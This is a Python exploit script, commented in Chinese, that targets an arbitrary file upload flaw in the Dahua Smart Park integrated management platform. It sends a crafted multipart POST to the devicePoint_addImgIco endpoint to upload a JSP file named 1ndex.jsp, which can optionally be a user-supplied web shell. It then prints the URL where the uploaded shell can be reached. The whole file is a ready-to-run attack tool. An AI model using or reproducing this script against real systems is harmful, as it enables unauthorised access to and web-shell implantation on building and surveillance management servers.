#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @userVersion : python 3.7
# @Author  : xxlm
# @Data    : 2023/7/12
# @Effect  : 大华智慧园区综合管理平台任意文件上传漏洞利用
# @Version : V1.0
# coding:utf-8

# 大华智慧园区综合管理平台任意文件上传漏洞利用

import argparse
import json
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings()


def verify(target,shellname):
    ShellContent="098f6bcd4621d373cade4e832627b4f6"
    if shellname!=None:
        ShellContent=open(shellname,'r',encoding='utf-8').read()
    parsed_url = urlparse(target)
    payload="/emap/devicePoint_addImgIco?hasSubsystem=true"
    baseurl=""
    if parsed_url.port:
        baseurl = parsed_url.scheme + "://" + parsed_url.hostname + ":" + str(parsed_url.port)
    else:
        baseurl=parsed_url.scheme+"://"+parsed_url.hostname
    posturl =baseurl+payload
    Headers={
        "Content-Type":"multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    data = "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT" + "\r\n"
    data = data + r'Content-Disposition: form-data; name="upload"; filename="1ndex.jsp"' + '\r\n'
    data = data + "Content-Type: application/octet-stream" + "\r\n"
    data = data + "Content-Transfer-Encoding: binary" + "\r\n" + "\r\n"
    data = data + ShellContent + "\r\n"
    data = data + "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--" + "\r\n"
    try:
        resp=requests.post(url=posturl,headers=Headers,data=data,timeout=10,verify=False,allow_redirects=False)
        if "data" in resp.text and resp.status_code==200:
            jsonResp=json.loads(resp.text)
            data=jsonResp.get("data")
            shellurl=baseurl=parsed_url.scheme+"://"+parsed_url.hostname+":8314/upload/emap/society_new/"+data
            print("存在大华智慧园区综合管理平台任意文件上传漏洞\n shell地址:"+shellurl)
        else:
            print("漏洞不存在")
    except Exception as e:
        print(str(e))

def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-url', help='目标URL地址')
    parser.add_argument('-shell', help='自定义shell文件')
    args = parser.parse_args()
    if args.url:
        verify(args.url,args.shell)
if __name__ == '__main__':
    main()